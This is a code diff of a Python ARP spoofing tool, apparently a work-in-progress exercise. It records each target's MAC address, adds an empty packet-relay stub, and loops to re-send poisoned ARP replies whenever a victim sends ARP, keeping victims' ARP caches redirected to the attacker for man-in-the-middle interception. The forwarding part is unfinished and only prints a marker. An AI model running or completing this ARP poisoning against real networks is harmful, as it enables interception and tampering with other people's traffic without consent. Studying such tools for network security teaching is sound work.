@@ -65,6 +65,9 @@ def arp_poison_send(ifname,my_mac,my_ip,sender_mac,sender_ip,target_ip):
     s.close()
     return
 
+def packet_relay():
+    return
+
 def main():
     ifname = sys.argv[1]
 
@@ -94,12 +97,12 @@ def main():
             if sender_ip_net==sender_arp_reply.sender_ip:
 
                 # save sender ip, mac
-                sender_mac_ip.append([sender_arp_reply.sender_mac,sender_ip_net,target_ip_net])
+                sender_mac_ip.append([sender_arp_reply.sender_mac,sender_ip_net,sender_arp_reply.target_mac,target_ip_net])
 
                 break
 
     # send poison reply
-    for s_mac,s_ip,t_ip in sender_mac_ip:
+    for s_mac,s_ip,t_mac,t_ip in sender_mac_ip:
         arp_poison_send(ifname,my_mac,my_ip,s_mac,s_ip,t_ip)
         #print(s_mac,s_ip,t_ip)
 
@@ -107,12 +110,17 @@ def main():
     while True:
         #2048size buffer
         chk_pkt=s.recvfrom(2048)
-        sender_arp_check=headers.arp_header(packet=chk_pkt[0])
-        sender_arp_check.arp_parser()
-        for s_mac,s_ip,t_ip in sender_mac_ip:
-            if s_ip==sender_arp_check.sender_ip:
+        sender_arp=headers.arp_header(packet=chk_pkt[0])
+        sender_arp.arp_parser()
+        for s_mac,s_ip,t_mac,t_ip in sender_mac_ip:
+            # relay to target
+            if s_ip==sender_arp.sender_ip and sender_arp.target_ip==t_ip:
+                #arp_poison_send(ifname,my_mac,my_ip,s_mac,s_ip,t_ip)
+                print("##")
+            # repoison to sender arp table
+            elif s_ip==sender_arp.sender_ip:
                 arp_poison_send(ifname,my_mac,my_ip,s_mac,s_ip,t_ip)
-                #print(sender_arp_check.sender_ip)
+                #print(sender_arp.sender_ip)
         #break
     return
     
